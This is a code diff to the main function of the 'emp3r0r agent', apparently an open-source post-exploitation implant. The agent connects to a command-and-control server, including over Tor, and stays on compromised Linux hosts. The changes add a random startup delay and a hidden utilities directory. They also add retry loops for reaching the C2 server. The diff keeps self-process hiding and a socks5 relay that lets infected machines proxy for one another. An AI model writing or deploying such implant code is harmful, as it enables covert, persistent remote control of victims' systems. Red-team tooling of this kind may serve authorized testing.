@@ -18,18 +18,37 @@ import (
 )
 
 func main() {
+	var err error
 	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
+	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// version
+	if *version {
+		fmt.Printf("emp3r0r agent (%s)\n", agent.Version)
+		return
+	}
+
+	// don't be hasty
+	time.Sleep(time.Duration(agent.RandInt(3, 10)) * time.Second)
 
 	// silent switch
 	log.SetOutput(ioutil.Discard)
 	if !*silent {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
+	}
+
+	// mkdir -p
+	if !agent.IsFileExist(agent.UtilsPath) {
+		err = os.MkdirAll(agent.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
+		}
 	}
 
 	// if the agent's process name is not "emp3r0r"
@@ -78,12 +97,17 @@ func main() {
 		// if we do, we are feeling helpful
 		ctx, cancel := context.WithCancel(context.Background())
 		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
-		go agent.StartBroadcast(ctx, cancel)
-	} else {
+		go agent.StartBroadcast(true, ctx, cancel)
+	} else if !tun.IsTor(agent.CCAddress) {
 		// we don't, just wait for some other agents to help us
 		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
 		ctx, cancel := context.WithCancel(context.Background())
-		go agent.BroadcastServer(ctx, cancel)
+		go func() {
+			err := agent.BroadcastServer(ctx, cancel)
+			if err != nil {
+				log.Fatal(err)
+			}
+		}()
 		for ctx.Err() == nil {
 			if agent.AgentProxy != "" {
 				log.Printf("[+] Thank you! We got a proxy: %s", agent.AgentProxy)
@@ -104,7 +128,7 @@ func main() {
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(agent.CCAddress) {
 		log.Printf("CC is on TOR: %s", agent.CCAddress)
-		agent.Transport = "TOR"
+		agent.Transport = fmt.Sprintf("TOR (%s)", agent.CCAddress)
 		agent.AgentProxy = *c2proxy
 		if *c2proxy == "" {
 			agent.AgentProxy = "socks5://127.0.0.1:9050"
@@ -137,7 +161,7 @@ func main() {
 	}
 
 	// hide process of itself if possible
-	err := agent.UpdateHIDE_PIDS()
+	err = agent.UpdateHIDE_PIDS()
 	if err != nil {
 		log.Print(err)
 	}
@@ -145,11 +169,11 @@ func main() {
 	// apply whatever proxy setting we have just added
 	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 connect:
-
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline(agent.AgentProxy) {
 		log.Println("CC not online")
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
+		goto connect
 	}
 
 	// check in with system info
